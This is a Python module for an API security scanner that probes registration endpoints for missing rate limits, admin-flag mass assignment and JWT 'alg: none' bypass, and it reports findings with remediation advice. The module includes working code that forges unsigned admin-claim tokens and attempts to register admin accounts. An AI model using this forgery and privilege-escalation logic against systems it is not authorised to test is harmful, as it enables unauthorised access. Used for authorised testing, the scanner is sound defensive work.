"""
Enhanced Unrestricted Account Creation Scanner Module.

This module tests for vulnerabilities related to unrestricted account creation,
including JWT bypass methods and other authorization issues that can lead to 
account enumeration, privilege escalation, and unauthorized access.

Enhanced to detect:
1. Traditional unrestricted account creation vulnerabilities
2. JWT bypass methods for account creation
3. Different API structures (RESTful, traditional, mobile)
4. Different field naming conventions
"""

import json
import time
import random
import string
import re
import base64
from typing import Dict, List, Any, Optional, Tuple, Set, Union

from core.base_scanner import BaseScanner
from core.openapi import find_endpoint_by_purpose


class EnhancedUnrestrictedAccountCreationScanner(BaseScanner):
    """Enhanced scanner for detecting unrestricted account creation and JWT bypass vulnerabilities."""
    
    def __init__(self, target: Dict[str, Any], config: Dict[str, Any]):
        """
        Initialize the scanner.
        
        Args:
            target: Target configuration
            config: Scanner-specific configuration
        """
        super().__init__(target, config)
        
        # Get scanner-specific configuration for account creation
        endpoints = config.get("endpoints", [])
        self.endpoint = config.get("endpoint", "/api/users")
        # If endpoints is provided as a list, use the first one
        if endpoints and isinstance(endpoints, list) and len(endpoints) > 0:
            self.endpoint = endpoints[0]
            
        self.method = config.get("method", "POST")
        
        # Enhanced test configuration
        self.test_count = config.get("test_count", 15)
        self.test_delay = config.get("test_delay", 0.5)
        
        # Rate limiting adaptation configuration
        self.adapt_to_rate_limiting = config.get("adapt_to_rate_limiting", True)
        self.initial_delay = self.test_delay
        self.max_delay = config.get("max_delay", 10.0)
        self.min_delay = config.get("min_delay", 0.1)
        self.delay_increment = config.get("delay_increment", 0.5)
        self.delay_decrement = config.get("delay_decrement", 0.1)
        self.success_threshold = config.get("success_threshold", 3)
        
        # Field names with better defaults
        self.username_field = config.get("username_field", "username")
        self.email_field = config.get("email_field", "email")
        self.password_field = config.get("password_field", "password")
        
        # Additional fields to include in the request
        self.additional_fields = config.get("additional_fields", {})
        
        # Success indicators with expanded defaults
        self.success_status_codes = config.get("success_status_codes", [200, 201, 202, 204])
        self.success_response_contains = config.get("success_response_contains", [])
        
        # Validation indicators with expanded defaults
        self.validation_status_codes = config.get("validation_status_codes", [400, 422, 409, 403])
        self.validation_response_contains = config.get("validation_response_contains", [])
        
        # Rate limiting indicators with expanded detection patterns
        self.rate_limit_status_codes = config.get("rate_limit_status_codes", [429, 403, 503])
        self.rate_limit_response_contains = config.get("rate_limit_response_contains", [
            "rate limit", "too many requests", "try again later", "throttled", 
            "slow down", "too many attempts", "too frequent", "wait", "limit exceeded"
        ])
        
        # Endpoints for various operations
        self.debug_endpoint = config.get("debug_endpoint", "/users/v1/_debug")
        self.register_endpoint = config.get("register_endpoint", "/users/v1/register")
        self.login_endpoint = config.get("login_endpoint", "/users/v1/login")
        self.password_change_endpoint = config.get("password_change_endpoint", "/users/v1/{username}/password")
        
        # Extract endpoints from OpenAPI spec if available
        self._extract_endpoints_from_openapi(target)
        
        # Log the resolved endpoints
        self.logger.info(f"Using endpoint: {self.endpoint}")
        self.logger.info(f"Using debug endpoint: {self.debug_endpoint}")
        self.logger.info(f"Using register endpoint: {self.register_endpoint}")
        self.logger.info(f"Using login endpoint: {self.login_endpoint}")
        self.logger.info(f"Using password change endpoint: {self.password_change_endpoint}")
        
        # Admin and auth fields
        self.admin_field = config.get("admin_field", "admin")
        self.auth_token_field = config.get("auth_token_field", "auth_token")
        
        # Test user credentials with better randomization
        timestamp = int(time.time())
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        self.test_username = config.get("test_username", f"test_user_{timestamp}_{random_suffix}")
        self.test_email = config.get("test_email", f"{self.test_username}@example.com")
        
        # More complex password that meets common requirements
        self.test_password = config.get("test_password", f"Test@{timestamp}#{random_suffix}")
        self.new_password = config.get("new_password", f"NewPass@{timestamp}#{random_suffix}")
        
        # Debug and simulation mode
        self.debug = config.get("debug", False)
        self.simulate_vulnerabilities = config.get("simulate_vulnerabilities", False)
        
        # Track successful account creations for later use
        self.created_accounts = []
        
        # JWT testing configuration
        self.test_jwt_bypass = config.get("test_jwt_bypass", True)
        self.jwt_token = None
        self.jwt_header = {}
        self.jwt_payload = {}
        
        if self.debug:
            self.logger.info("Debug mode enabled")
            if self.simulate_vulnerabilities:
                self.logger.info("Simulation mode enabled - simulating vulnerabilities")
    
    def _extract_endpoints_from_openapi(self, target: Dict[str, Any]) -> None:
        """
        Extract API endpoints from OpenAPI specification.
        
        Args:
            target: Target configuration containing OpenAPI data
        """
        # Check if OpenAPI data is available
        if not target.get("openapi_endpoints"):
            self.logger.info("No OpenAPI data available for endpoint extraction")
            return
        
        # Get endpoints from OpenAPI data
        endpoints = target.get("openapi_endpoints", [])
        self.logger.info(f"Found {len(endpoints)} endpoints in OpenAPI specification")
        
        # Enhanced endpoint detection for account creation/registration
        # Look for both standard patterns and RESTful API patterns like Snorefox
        register_patterns = [
            "create_user", "register", "signup", "sign-up", "sign_up", 
            "auth/sign-up", "auth/signup", "auth/register", "users/create",
            "account/create", "account/register", "new-user", "new-account"
        ]
        
        # Find registration endpoint with improved pattern matching
        best_register_endpoint = self.register_endpoint
        best_score = 0
        
        for endpoint in endpoints:
            path = endpoint.get("path", "")
            method = endpoint.get("method", "").upper()
            description = endpoint.get("description", "").lower()
            summary = endpoint.get("summary", "").lower()
            operation_id = endpoint.get("operationId", "").lower()
            
            # Only consider POST methods for registration
            if method != "POST":
                continue
                
            score = 0
            # Check path for registration patterns
            for pattern in register_patterns:
                if pattern in path.lower():
                    score += 3
                    
            # Check description, summary, and operationId
            for pattern in ["register", "signup", "sign up", "sign-up", "create user", "create account"]:
                if pattern in description:
                    score += 2
                if pattern in summary:
                    score += 2
                if pattern in operation_id:
                    score += 2
            
            # Check for request body parameters that indicate registration
            if "requestBody" in endpoint:
                schema = endpoint.get("requestBody", {}).get("content", {}).get("application/json", {}).get("schema", {})
                properties = schema.get("properties", {})
                
                # Check for common registration fields
                for field in ["username", "email", "password", "name", "firstName", "lastName"]:
                    if field in properties:
                        score += 1
                        
                # If we have at least 3 registration-related fields, this is likely a registration endpoint
                if score >= 3:
                    score += 3
            
            if score > best_score:
                best_score = score
                best_register_endpoint = path
                self.method = method
        
        if best_score > 0:
            self.register_endpoint = best_register_endpoint
            self.endpoint = best_register_endpoint
            self.logger.info(f"Found registration endpoint: {self.register_endpoint}")
        
        # Find login endpoint
        login_patterns = [
            "login", "signin", "sign-in", "sign_in", 
            "auth/sign-in", "auth/signin", "auth/login", "users/login",
            "account/login", "account/signin", "token"
        ]
        
        best_login_endpoint = self.login_endpoint
        best_score = 0
        
        for endpoint in endpoints:
            path = endpoint.get("path", "")
            method = endpoint.get("method", "").upper()
            description = endpoint.get("description", "").lower()
            summary = endpoint.get("summary", "").lower()
            operation_id = endpoint.get("operationId", "").lower()
            
            # Only consider POST methods for login
            if method != "POST":
                continue
                
            score = 0
            # Check path for login patterns
            for pattern in login_patterns:
                if pattern in path.lower():
                    score += 3
                    
            # Check description, summary, and operationId
            for pattern in ["login", "signin", "sign in", "sign-in", "authenticate", "token"]:
                if pattern in description:
                    score += 2
                if pattern in summary:
                    score += 2
                if pattern in operation_id:
                    score += 2
            
            # Check for request body parameters that indicate login
            if "requestBody" in endpoint:
                schema = endpoint.get("requestBody", {}).get("content", {}).get("application/json", {}).get("schema", {})
                properties = schema.get("properties", {})
                
                # Check for common login fields
                for field in ["username", "email", "password"]:
                    if field in properties:
                        score += 1
                        
                # If we have at least 2 login-related fields, this is likely a login endpoint
                if score >= 2:
                    score += 3
            
            if score > best_score:
                best_score = score
                best_login_endpoint = path
        
        if best_score > 0:
            self.login_endpoint = best_login_endpoint
            self.logger.info(f"Found login endpoint: {self.login_endpoint}")
    
    def _get_valid_jwt_token(self) -> Optional[str]:
        """
        Get a valid JWT token from the API.
        
        Returns:
            JWT token string or None if not found
        """
        # Check if we already have a token from the auth handler
        auth_header = self.auth_handler.get_auth_header()
        if auth_header and "Authorization" in auth_header:
            auth_value = auth_header["Authorization"]
            if auth_value.startswith("Bearer "):
                token = auth_value.split(" ")[1]
                self.logger.info("Using JWT token from auth handler")
                return token
        
        # Try to get a token from login endpoints
        try:
            # Prepare credentials
            credentials = self.auth.get("credentials", {})
            username = credentials.get("username", credentials.get("email", ""))
            password = credentials.get("password", "")
            
            if not username or not password:
                self.logger.warning("No credentials available for login")
                return None
            
            # Prepare payload with common field names
            payload = {
                "username": username,
                "email": username,
                "password": password
            }
            
            # Try to login
            self.logger.info(f"Attempting to login at {self.login_endpoint}")
            response = self._make_request(
                "POST",
                self.login_endpoint,
                json_data=payload,
                try_auth_if_needed=False
            )
            
            # Check if login was successful
            if response.status_code in [200, 201, 204]:
                try:
                    response_json = response.json()
                    
                    # Look for token in response
                    token_fields = ["token", "access_token", "accessToken", "id_token", "idToken", "jwt"]
                    for field in token_fields:
                        if field in response_json:
                            token = response_json[field]
                            if isinstance(token, str) and "." in token:
                                self.logger.info(f"Found JWT token in {field} field")
                                return token
                    
                    # Look for token in nested objects
                    for key, value in response_json.items():
                        if isinstance(value, dict):
                            for field in token_fields:
                                if field in value:
                                    token = value[field]
                                    if isinstance(token, str) and "." in token:
                                        self.logger.info(f"Found JWT token in {key}.{field} field")
                                        return token
                except Exception as e:
                    self.logger.debug(f"Error parsing login response: {str(e)}")
        except Exception as e:
            self.logger.debug(f"Error during login: {str(e)}")
        
        self.logger.warning("Could not obtain a valid JWT token")
        return None
    
    def _parse_jwt_token(self, token: str) -> bool:
        """
        Parse a JWT token into header and payload.
        
        Args:
            token: JWT token string
            
        Returns:
            True if parsing was successful, False otherwise
        """
        try:
            # Split the token
            parts = token.split(".")
            if len(parts) < 2:
                self.logger.warning("Invalid JWT token format")
                return False
                
            # Decode header
            header_b64 = parts[0]
            # Add padding if needed
            header_b64 += "=" * ((4 - len(header_b64) % 4) % 4)
            header_json = base64.b64decode(header_b64).decode("utf-8")
            self.jwt_header = json.loads(header_json)
            
            # Decode payload
            payload_b64 = parts[1]
            # Add padding if needed
            payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)
            payload_json = base64.b64decode(payload_b64).decode("utf-8")
            self.jwt_payload = json.loads(payload_json)
            
            self.logger.info(f"Parsed JWT token: alg={self.jwt_header.get('alg')}")
            return True
        except Exception as e:
            self.logger.warning(f"Error parsing JWT token: {str(e)}")
            return False
    
    def _create_modified_token(self, 
                              header_modifications: Dict[str, Any] = None, 
                              payload_modifications: Dict[str, Any] = None,
                              sign_with_key: str = None) -> str:
        """
        Create a modified JWT token.
        
        Args:
            header_modifications: Modifications to make to the header
            payload_modifications: Modifications to make to the payload
            sign_with_key: Key to use for signing, or None for 'none' algorithm
            
        Returns:
            Modified JWT token
        """
        # Start with the original header and payload
        header = self.jwt_header.copy()
        payload = self.jwt_payload.copy()
        
        # Apply header modifications
        if header_modifications:
            header.update(header_modifications)
            
        # Apply payload modifications
        if payload_modifications:
            payload.update(payload_modifications)
            
        # Create the token
        if header.get("alg") == "none" or not sign_with_key:
            # For 'none' algorithm, we need to create the token manually
            header_b64 = base64.b64encode(json.dumps(header).encode()).decode().rstrip("=")
            payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode().rstrip("=")
            return f"{header_b64}.{payload_b64}."
        else:
            # For other algorithms, use PyJWT
            try:
                import jwt
                return jwt.encode(payload, sign_with_key, algorithm=header.get("alg"), headers=header)
            except ImportError:
                self.logger.error("PyJWT library not available, cannot create signed token")
                # Fallback to creating an unsigned token
                header_b64 = base64.b64encode(json.dumps(header).encode()).decode().rstrip("=")
                payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode().rstrip("=")
                return f"{header_b64}.{payload_b64}."
    
    def _register_user(self, username: str, email: str, password: str, admin: bool = False) -> Tuple[bool, Optional[Dict[str, Any]]]:
        """
        Register a new user.
        
        Args:
            username: Username for the new user
            email: Email for the new user
            password: Password for the new user
            admin: Whether to attempt to register as an admin
            
        Returns:
            Tuple of (success, response_data)
        """
        self.logger.info(f"Registering user '{username}' with admin={admin}")
        
        # Prepare payload with common field names
        payload = {
            self.username_field: username,
            self.email_field: email,
            self.password_field: password
        }
        
        # Add admin field if requested
        if admin:
            payload[self.admin_field] = True
            
        # Add any additional fields from configuration
        payload.update(self.additional_fields)
        
        try:
            response = self._make_request(
                method=self.method,
                endpoint=self.register_endpoint,
                json_data=payload
            )
            
            # Check if registration was successful
            if response.status_code in self.success_status_codes:
                self.logger.info(f"Successfully registered user '{username}'")
                try:
                    response_data = response.json()
                    return True, response_data
                except (ValueError, json.JSONDecodeError):
                    return True, {"status_code": response.status_code, "text": response.text}
            else:
                self.logger.info(f"Failed to register user '{username}', status code: {response.status_code}")
                try:
                    response_data = response.json()
                    return False, response_data
                except (ValueError, json.JSONDecodeError):
                    return False, {"status_code": response.status_code, "text": response.text}
        except Exception as e:
            self.logger.error(f"Error registering user '{username}': {str(e)}")
            return False, None
    
    def _test_unrestricted_account_creation(self) -> None:
        """Test for unrestricted account creation vulnerability."""
        self.logger.info("Testing for unrestricted account creation vulnerability")
        
        # Try to create multiple accounts in rapid succession
        successful_creations = 0
        failed_creations = 0
        
        for i in range(self.test_count):
            # Generate unique user credentials
            timestamp = int(time.time())
            random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            username = f"test_user_{timestamp}_{random_suffix}_{i}"
            email = f"{username}@example.com"
            password = f"Test@{timestamp}#{random_suffix}"
            
            # Try to register the user
            success, response_data = self._register_user(username, email, password)
            
            if success:
                successful_creations += 1
                self.created_accounts.append({"username": username, "email": email, "password": password})
            else:
                failed_creations += 1
            
            # Sleep to avoid rate limiting
            time.sleep(self.test_delay)
        
        # Check if we were able to create multiple accounts
        if successful_creations >= 3:
            self.logger.warning(f"Unrestricted account creation vulnerability detected: created {successful_creations} accounts")
            self.add_finding(
                vulnerability="Unrestricted Account Creation",
                severity="HIGH",
                endpoint=self.register_endpoint,
                details=(
                    f"The API allows unrestricted creation of multiple user accounts in rapid succession. "
                    f"Successfully created {successful_creations} accounts out of {self.test_count} attempts."
                ),
                evidence={
                    "successful_creations": successful_creations,
                    "failed_creations": failed_creations,
                    "created_accounts": [account["username"] for account in self.created_accounts[:3]]
                },
                remediation=(
                    "1. Implement rate limiting for account creation.\n"
                    "2. Add CAPTCHA or other anti-automation measures.\n"
                    "3. Require email verification before account activation.\n"
                    "4. Implement IP-based restrictions for multiple account creations."
                )
            )
        else:
            self.logger.info(f"No unrestricted account creation vulnerability detected: created {successful_creations} accounts")
    
    def _test_admin_account_creation(self) -> None:
        """Test for admin account creation vulnerability."""
        self.logger.info("Testing for admin account creation vulnerability")
        
        # Generate unique admin user credentials
        timestamp = int(time.time())
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        username = f"admin_user_{timestamp}_{random_suffix}"
        email = f"{username}@example.com"
        password = f"Admin@{timestamp}#{random_suffix}"
        
        # Try to register an admin user
        success, response_data = self._register_user(username, email, password, admin=True)
        
        if success:
            self.logger.warning("Admin account creation vulnerability detected")
            self.add_finding(
                vulnerability="Admin Account Creation",
                severity="CRITICAL",
                endpoint=self.register_endpoint,
                details=(
                    "The API allows creation of admin accounts through the registration endpoint. "
                    "Successfully created an admin account by including an admin field in the request."
                ),
                evidence={
                    "username": username,
                    "admin_field": self.admin_field,
                    "response": response_data
                },
                remediation=(
                    "1. Remove the ability to set admin privileges during registration.\n"
                    "2. Implement proper role-based access control.\n"
                    "3. Only allow existing admins to create new admin accounts.\n"
                    "4. Validate and sanitize all input fields to prevent privilege escalation."
                )
            )
        else:
            self.logger.info("No admin account creation vulnerability detected")
    
    def _test_jwt_bypass_account_creation(self) -> None:
        """Test for JWT bypass account creation vulnerability."""
        if not self.test_jwt_bypass:
            self.logger.info("Skipping JWT bypass account creation test")
            return
            
        self.logger.info("Testing for JWT bypass account creation vulnerability")
        
        # Get a valid JWT token
        self.jwt_token = self._get_valid_jwt_token()
        if not self.jwt_token:
            self.logger.warning("Could not obtain a valid JWT token, skipping JWT bypass test")
            return
            
        # Parse the token
        if not self._parse_jwt_token(self.jwt_token):
            self.logger.warning("Could not parse JWT token, skipping JWT bypass test")
            return
            
        # Create a modified token with admin privileges
        modified_token = self._create_modified_token(
            header_modifications={"alg": "none", "typ": "JWT"},
            payload_modifications={"role": "admin", "isAdmin": True, "admin": True}
        )
        
        # Generate unique user credentials
        timestamp = int(time.time())
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        username = f"jwt_bypass_user_{timestamp}_{random_suffix}"
        email = f"{username}@example.com"
        password = f"JwtBypass@{timestamp}#{random_suffix}"
        
        # Prepare payload
        payload = {
            self.username_field: username,
            self.email_field: email,
            self.password_field: password,
            self.admin_field: True
        }
        
        # Try to register with the modified JWT token
        try:
            response = self._make_request(
                method=self.method,
                endpoint=self.register_endpoint,
                json_data=payload,
                headers={"Authorization": f"Bearer {modified_token}"}
            )
            
            # Check if registration was successful
            if response.status_code in self.success_status_codes:
                self.logger.warning("JWT bypass account creation vulnerability detected")
                self.add_finding(
                    vulnerability="JWT Bypass for Admin Account Creation",
                    severity="CRITICAL",
                    endpoint=self.register_endpoint,
                    details=(
                        "The API allows creation of admin accounts by bypassing access controls using a modified JWT token. "
                        "Successfully created an admin account by using a token with the 'none' algorithm and admin privileges."
                    ),
                    evidence={
                        "username": username,
                        "modified_token": modified_token,
                        "response_code": response.status_code
                    },
                    remediation=(
                        "1. Reject tokens with 'none' algorithm by explicitly checking the algorithm.\n"
                        "2. Implement proper signature verification for all tokens.\n"
                        "3. Validate all claims in the token, especially role and permission claims.\n"
                        "4. Implement proper role-based access control for account creation endpoints."
                    )
                )
            else:
                self.logger.info("No JWT bypass account creation vulnerability detected")
        except Exception as e:
            self.logger.error(f"Error testing JWT bypass: {str(e)}")
    
    def run(self) -> List[Dict[str, Any]]:
        """
        Run the scanner.
        
        Returns:
            List of findings
        """
        self.logger.info("Starting enhanced unrestricted account creation scanner")
        
        # Test for unrestricted account creation
        self._test_unrestricted_account_creation()
        
        # Test for admin account creation
        self._test_admin_account_creation()
        
        # Test for JWT bypass account creation
        self._test_jwt_bypass_account_creation()
        
        return self.findings
